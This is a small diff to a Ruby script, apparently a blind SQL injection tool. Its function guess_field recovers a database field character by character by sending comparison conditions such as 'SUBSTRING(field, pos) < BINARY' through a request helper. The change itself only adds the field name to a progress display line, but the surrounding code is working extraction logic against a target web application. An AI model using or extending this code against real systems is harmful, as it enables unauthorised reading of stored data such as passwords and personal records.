@@ -50,7 +50,7 @@ def guess_field(user_id, table_field)
         char_index = guess_val(MIN_TABLE_CHAR) do |char_comp|
             char = char_comp.chr(Encoding::UTF_8)
             escaped_char = (SQL_ESCAPE_CHARS.include? char)?('\\' + char) : char
-            print "\r#{current_value}#{char.sub(/[^[:print:]]/, ' ')}"; #visual
+            print "\r#{table_field}: #{current_value}#{char.sub(/[^[:print:]]/, ' ')}"; #visual
             request_val user_id, "SUBSTRING(#{table_field}, #{char_pos}) < BINARY '#{escaped_char}'"
         end
         break if char_index <= MIN_TABLE_CHAR
